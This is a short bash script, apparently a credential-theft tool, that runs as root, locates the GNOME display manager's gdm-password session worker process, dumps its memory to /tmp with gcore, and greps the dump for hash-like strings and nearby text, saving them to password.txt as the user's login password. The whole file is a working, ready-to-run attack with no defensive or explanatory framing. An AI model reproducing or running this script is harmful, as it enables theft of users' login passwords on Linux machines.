#! /bin/bash
#Check if root
if [ `id -u` != 0 ] ; then
        echo "Must run as root - You are dumping memory after all."
	exit 1
fi 
#get gdm-session-worker [pam/gdm-password] process memory
PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
 
gcore -o /tmp/dump $PID >& /dev/null
 
strings /tmp/dump.${PID} | egrep '^\$.\$.+$' -B 10 -A 10 > password.txt
echo "Password located somewhere within password.txt"
